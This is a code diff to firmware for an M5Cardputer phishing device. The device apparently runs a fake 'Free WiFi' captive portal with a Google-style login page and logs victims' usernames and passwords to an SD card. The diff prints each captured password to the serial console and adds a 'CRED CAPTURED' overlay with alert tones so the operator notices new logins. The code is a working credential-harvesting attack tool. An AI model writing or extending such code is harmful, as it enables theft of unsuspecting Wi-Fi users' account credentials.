@@ -120,6 +120,12 @@ static volatile uint32_t s_hits  = 0;
 static const char *s_current_html = HTML_GOOGLE;
 static char s_portal_ssid[33] = "Free WiFi";
 
+/* Set by log_cred() when a new credential lands. Picked up by the main
+ * loop a moment later so the HTTP response isn't stalled behind the
+ * 1.2s action-overlay animation. */
+static volatile bool s_cred_flash = false;
+static char          s_last_user[48] = {0};
+
 static void log_cred(const String &u, const String &p, const String &src)
 {
     File f = SD.open("/poseidon/creds.log", FILE_APPEND);
@@ -129,6 +135,12 @@ static void log_cred(const String &u, const String &p, const String &src)
              s_portal_ssid, src.c_str(), u.c_str(), p.c_str());
     f.close();
     s_creds++;
+    /* Defer the overlay to the main loop — HTTP handler runs synchronously
+     * inside handleClient() and blocking here delays the 200 response. */
+    strncpy(s_last_user, u.c_str(), sizeof(s_last_user) - 1);
+    s_last_user[sizeof(s_last_user) - 1] = '\0';
+    s_cred_flash = true;
+    Serial.printf("[portal] CRED u=%s p=%s\n", u.c_str(), p.c_str());
 }
 
 static void handle_login(void)
@@ -234,6 +246,21 @@ static void run_portal(void)
     while (true) {
         s_dns->processNextRequest();
         s_http->handleClient();
+
+        /* New cred? Dramatic overlay + tone so the operator notices from
+         * across the room. Overlay is blocking (1.2s) so the DNS/HTTP
+         * handlers pause during it — acceptable because the HTTP 200
+         * response has already gone out from inside the handler. */
+        if (s_cred_flash) {
+            s_cred_flash = false;
+            M5Cardputer.Speaker.tone(1800, 80);
+            delay(90);
+            M5Cardputer.Speaker.tone(2400, 120);
+            ui_action_overlay("CRED CAPTURED",
+                              s_last_user[0] ? s_last_user : "no user",
+                              ACT_BG_WAVES, T_BAD, 1200);
+            last = 0;  /* force redraw of the live counters */
+        }
 
         if (millis() - last > 250) {
             last = millis();
